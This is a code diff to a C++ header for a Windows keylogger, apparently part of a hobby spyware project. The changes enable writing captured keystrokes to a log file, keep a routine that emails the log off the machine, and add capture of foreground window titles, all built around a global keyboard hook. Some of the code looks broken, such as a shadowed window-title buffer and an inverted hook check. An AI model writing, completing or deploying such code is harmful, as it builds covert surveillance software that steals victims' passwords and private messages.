@@ -6,9 +6,11 @@
 #include "windows.h"
 #include "KeyConstants.h"
 #include "Helper.h"
-//#include "Timer.h"
+#include "Timer.h"
+#include "IO.h"
 //#include "SendMail.h"
 
+extern char lastwindow[256];
 
 std::string keylog = "";
 
@@ -21,7 +23,7 @@ void TimerSendMail()
     if(keylog.empty())
         return;
 
-    std::string last_file ; //= IO::WriteLog(keylog);
+    std::string last_file = IO::WriteLog(keylog);
 
     if(last_file.empty())
     {
@@ -33,13 +35,32 @@ void TimerSendMail()
 
     if( retValue != 7 )
         Helper::WriteAppLog("Mail was not sent!! Error Code :" + Helper::ToString(retValue));
-    else {
+    else
+    {
         // Since everything went well, now we will be clearing the keylog contents
         keylog = "";
     }
 }
 
-// Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite);
+void GetActiveWindowText()
+{
+    char lastwindow[256];
+
+    HWND foreground = GetForegroundWindow();
+    if (foreground)
+    {
+        char window_title[256];
+        GetWindowText(foreground, window_title, 256);
+
+        if(strcmp(window_title, lastwindow)!=0)
+        {
+            strcpy(lastwindow, window_title);
+            Helper::WriteAppLog(window_title);
+        }
+    }
+}
+
+// Timer MailTimer(TimerSendMail, 10 * 6, Timer::Infinite);
 
 HHOOK eHook = NULL;
 
@@ -54,6 +75,8 @@ LRESULT OurKeyboardProc (int nCode, WPARAM wparam, LPARAM lparam)
     {
         keylog += Keys::KEYS[kbs->vkCode].Name;
 
+        // If this kbs->vkCode is 1 or 2 then its a mouse stroke, i think.
+
         // when someone presses the return key, its better to go to next line rather than log it, hence \n
         if( kbs->vkCode == VK_RETURN )
             keylog += '\n';
@@ -62,22 +85,22 @@ LRESULT OurKeyboardProc (int nCode, WPARAM wparam, LPARAM lparam)
     {
         DWORD key = kbs->vkCode;
         if( key == VK_CONTROL
-               || key == VK_LCONTROL
-               || key == VK_RCONTROL
+                || key == VK_LCONTROL
+                || key == VK_RCONTROL
 
-               || key == VK_SHIFT
-               || key == VK_LSHIFT
-               || key == VK_RSHIFT
+                || key == VK_SHIFT
+                || key == VK_LSHIFT
+                || key == VK_RSHIFT
 
-               || key == VK_MENU
-               || key == VK_LMENU
-               || key == VK_RMENU
+                || key == VK_MENU
+                || key == VK_LMENU
+                || key == VK_RMENU
 
-               || key == VK_CAPITAL
-               || key == VK_NUMLOCK
-               || key == VK_LWIN
-               || key == VK_RWIN
-           )
+                || key == VK_CAPITAL
+                || key == VK_NUMLOCK
+                || key == VK_LWIN
+                || key == VK_RWIN
+          )
         {
             std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
 
@@ -86,6 +109,8 @@ LRESULT OurKeyboardProc (int nCode, WPARAM wparam, LPARAM lparam)
             keylog += KeyName;
         }
     }
+
+    // GetActiveWindowText();
 
     TimerSendMail();
 
@@ -114,4 +139,5 @@ bool IsHooked()
 {
     return (bool) (eHook == NULL);
 }
+
 #endif // __KEYBHOOK_H__
